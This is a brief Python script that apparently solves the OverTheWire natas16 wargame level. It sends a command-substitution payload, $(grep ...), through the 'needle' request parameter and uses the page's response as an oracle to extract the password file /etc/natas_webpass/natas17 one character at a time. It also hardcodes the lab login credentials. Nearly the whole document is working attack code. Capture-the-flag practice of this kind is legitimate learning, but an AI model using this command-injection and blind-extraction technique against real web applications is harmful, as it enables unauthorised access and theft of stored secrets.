import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth = ("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
characters = string.ascii_letters + string.digits  # Characters to test: a-z, A-Z, and 0-9
password = ""

for position in range(1, 33):  # Assuming the password length is 32 characters
    for char in characters:
        payload = {
            "needle": f"$(grep -E ^{password + char} /etc/natas_webpass/natas17)anything"
        }
        response = requests.get(url, auth=auth, params=payload)

        if "anything" not in response.text:
            password += char
            print(f"Found character at position {position}: {char}")
            break

print(f"Password: {password}")
